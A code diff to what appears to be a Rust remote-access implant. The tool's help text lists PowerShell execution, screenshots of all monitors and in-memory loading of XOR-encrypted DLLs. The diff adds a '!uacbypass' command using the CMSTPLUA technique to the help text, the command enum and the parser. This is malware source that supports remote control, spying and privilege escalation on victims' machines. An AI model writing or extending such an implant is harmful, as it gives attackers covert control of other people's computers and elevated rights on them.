@@ -7,6 +7,7 @@ const HELP_TEXT: &str = "**Available commands:**\n\
     - `shell <command>` - Execute a PowerShell command\n\
     - `scr` - Take a screenshot of all monitors\n\
     - `!loaddll [name]` - Load attached DLL (XOR encrypted) into memory\n\
+    - `!uacbypass [cmd]` - UAC bypass via CMSTPLUA (method 41)\n\
     - `help` - Show this help message";
 
 /// Generate help message for unknown commands
@@ -35,6 +36,10 @@ pub enum Command {
     /// Load a DLL from attachment
     /// Format: "!loaddll [dll_name]"
     LoadDll(String),
+
+    /// UAC bypass to execute with elevated privileges
+    /// Format: "!uacbypass [command]"
+    UacBypass(String),
 
     /// Show help message
     /// Format: "help"
@@ -84,6 +89,18 @@ impl Command {
 
             let dll_name = content[prefix_len..].trim().to_string();
             return Command::LoadDll(dll_name);
+        }
+
+        // Check for "!uacbypass" prefix
+        if content_lower.starts_with("!uacbypass") || content_lower.starts_with("uacbypass") {
+            let prefix_len = if content_lower.starts_with("!uacbypass") {
+                "!uacbypass".len()
+            } else {
+                "uacbypass".len()
+            };
+
+            let cmd = content[prefix_len..].trim().to_string();
+            return Command::UacBypass(cmd);
         }
 
         Command::Unknown(content.to_string())
